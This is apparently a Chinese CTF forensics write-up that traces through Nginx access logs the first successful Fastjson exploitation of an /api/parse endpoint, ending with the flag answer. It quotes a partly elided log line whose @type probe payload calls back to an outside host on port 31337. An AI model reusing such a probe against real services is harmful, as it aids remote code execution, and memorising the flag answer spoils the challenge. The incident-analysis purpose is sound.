# 任务 1：首次成功利用的来源与时间

## 题目要求

定位攻击者首次成功利用报文解析接口漏洞的来源 IP 和时间。

提交格式：`flag{[来源IP]_[YYYYMMDD-HHMMSS]}`

## 分析过程

通过 SSH 登录靶机后，查看 Nginx 访问日志：

```bash
grep -n "/api/parse" /var/log/nginx/access.log
```

攻击者 `203.0.113.7` 在 03:37 左右对 `/admin`、`/actuator/env`、`/api/v2/health` 等路径进行扫描，这些请求均返回 `404`。之后发现第一条带有 Fastjson `@type` 探测载荷且返回成功的请求：

```text
203.0.113.7 - - [12/Aug/2026:03:42:17 +0800]
"GET /api/parse?msg=...@type...http://3405803783:31337/probe... HTTP/1.1"
200 58 "-" "python-requests/2.31.0" 0.913
```

判断依据：

- 来源 IP 为 `203.0.113.7`；
- 目标是存在漏洞的 `/api/parse` 接口；
- 参数中包含 Fastjson `@type`；
- 响应状态为 `200`，且耗时约 `0.913` 秒；
- 后续同一来源的 SQL 注入及其他类型载荷主要返回 `400/500`，属于失败尝试。

日志中的时间为 `12/Aug/2026:03:42:17 +0800`，按题目格式转换为 `20260812-034217`。

## 结论

来源 IP：`203.0.113.7`

最早成功请求时间：`2026-08-12 03:42:17`

按题目给定格式：


```text
flag{203.0.113.7_20260812-034217}
```
